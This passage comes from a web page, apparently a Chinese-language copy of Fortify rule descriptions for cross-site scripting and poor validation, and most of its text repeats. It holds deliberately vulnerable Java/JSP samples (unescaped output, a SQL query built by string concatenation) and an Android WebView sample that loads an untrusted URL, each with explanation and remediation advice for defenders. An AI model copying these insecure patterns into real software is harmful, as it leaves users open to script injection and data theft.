class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Employee Name: &lt;c:out value=&quot;$&#123;name&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>如同例 1，如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。同样，这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        WebView webview = (WebView) findViewById(R.id.webview);</span><br><span class="line"></span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(true);</span><br><span class="line"></span><br><span class="line">        String url = this.getIntent().getExtras().getString(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">        webview.loadUrl(URLEncoder.encode(url));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<p>－ 如例 1 所述，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行，就会发生反射式 XSS 盗取。发送恶意内容最常用的方法是，把恶意内容作为一个参数包含在公开发表的 URL 中，或者通过电子邮件直接发送给受害者。以这种手段构造的 URL 构成了多种“网络钓鱼”(phishing) 阴谋的核心，攻击者借此诱骗受害者访问指向易受攻击站点的 URL。站点将攻击者的内容反馈给受害者以后，便会执行这些内容，接下来会把用户计算机中的各种私密信息（比如包含会话信息的 cookie）传送给攻击者，或者执行其他恶意活动。</p>
<p>－ 如例 2 所述，应用程序将危险数据储存在一个数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>— 正如例 3 所示，应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并存储在动态内容中。</p>
<p>许多现代 Web 框架都提供对用户输入执行验证的机制。其中包括 Struts 和 Struts 2。为了突出显示未经验证的输入源，Fortify 安全编码规则包会降低 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题被利用的可能性，并在使用框架验证机制时提供相应的依据，以动态重新调整问题优先级。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队提供了数据验证项目模板，该模板会根据应用于输入源的验证机制，将问题分组到多个文件夹中。</p>
<h5 id="RECOMMENDATIONS-261"><a href="#RECOMMENDATIONS-261" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code> 的正文内：</p>
<p>— 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>一旦在应用程序中确定了针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符，下一个难点就是定义验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-260"><a href="#REFERENCES-260" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin Attacks on WebView in the Android System</p>
<p>[4] Erika Chin and David Wagner Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</p>
<p>[5] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[21] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Cross-Site-Scripting-Poor-Validation-1"><a href="#Cross-Site-Scripting-Poor-Validation-1" class="headerlink" title="Cross-Site Scripting: Poor Validation"></a>Cross-Site Scripting: Poor Validation</h4><h5 id="ABSTRACT-262"><a href="#ABSTRACT-262" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>依靠 HTML、XML 或其他类型编码验证用户输入可能会导致浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-263"><a href="#EXPLANATION-263" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用特定的编码构造，例如带有 escapeXml=“true” 属性（默认设置）的 <code>&lt;c:out/&gt;</code> 标签可以避免一部分 cross-site scripting 攻击，但不能完全避免。根据数据出现的上下文，除 HTML 编码的基本字符 &lt;、&gt;、&amp; 和 “ 以及 XML 编码的字符 &lt;、&gt;、&amp;、” 和 ‘ 之外，其他字符可能具有元意。依靠此类编码构造等同于用一个安全性较差的黑名单来防止 cross-site scripting 攻击，并且可能允许攻击者注入恶意代码，并在浏览器中加以执行。由于不可能始终准确地确定静态显示数据的上下文，所以即便进行了编码，Fortify Static Code Analyzer（Fortify 静态代码分析器）仍会报告跨站脚本攻击结果，并将其显示为 Cross-Site Scripting: Poor Validation 问题。</p>
<p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Reflected XSS，不可信赖的源大多数情况下为 Web 请求；而对于 Persistent（也称为 Stored）XSS，该源通常为数据库查询的结果。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例 1：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并通过 <code>&lt;c:out/&gt;</code> 标签将其显示给用户。</p>
<p><code>Employee ID: &lt;c:out value=&quot;${param.eid}&quot;/&gt;</code></p>
<p>如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码的 URL，并且还在自己的电脑上运行呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或者社会工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>示例 2：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并通过 <code>&lt;c:out/&gt;</code> 标签输出相应雇员姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%...</span><br><span class="line"></span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid);</span><br><span class="line"></span><br><span class="line">if (rs != null) &#123;</span><br><span class="line"></span><br><span class="line">   rs.next();</span><br><span class="line"></span><br><span class="line">   String name = rs.getString(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Employee Name: &lt;c:out value=&quot;$&#123;name&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>如同例 1，如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。同样，这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        WebView webview = (WebView) findViewById(R.id.webview);</span><br><span class="line"></span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(true);</span><br><span class="line"></span><br><span class="line">        String url = this.getIntent().getExtras().getString(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">        webview.loadUrl(URLEncoder.encode(url));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<p>－ 如例 1 所述，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行，就会发生反射式 XSS 盗取。发送恶意内容最常用的方法是，把恶意内容作为一个参数包含在公开发表的 URL 中，或者通过电子邮件直接发送给受害者。以这种手段构造的 URL 构成了多种“网络钓鱼”(phishing) 阴谋的核心，攻击者借此诱骗受害者访问指向易受攻击站点的 URL。站点将攻击者的内容反馈给受害者以后，便会执行这些内容，接下来会把用户计算机中的各种私密信息（比如包含会话信息的 cookie）传送给攻击者，或者执行其他恶意活动。</p>
<p>－ 如例 2 所述，应用程序将危险数据储存在一个数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>— 正如例 3 所示，应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并存储在动态内容中。</p>
<p>许多现代 Web 框架都提供对用户输入执行验证的机制。其中包括 Struts 和 Struts 2。为了突出显示未经验证的输入源，Fortify 安全编码规则包会降低 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题被利用的可能性，并在使用框架验证机制时提供相应的依据，以动态重新调整问题优先级。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队提供了数据验证项目模板，该模板会根据应用于输入源的验证机制，将问题分组到多个文件夹中。</p>
<h5 id="RECOMMENDATIONS-262"><a href="#RECOMMENDATIONS-262" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code> 的正文内：</p>
<p>— 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>一旦在应用程序中确定了针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符，下一个难点就是定义验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-261"><a href="#REFERENCES-261" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin Attacks on WebView in the Android System</p>
<p>[4] Erika Chin and David Wagner Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</p>
<p>[5] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 82, CWE ID 83, CWE ID 87, CWE ID 692</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[21] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
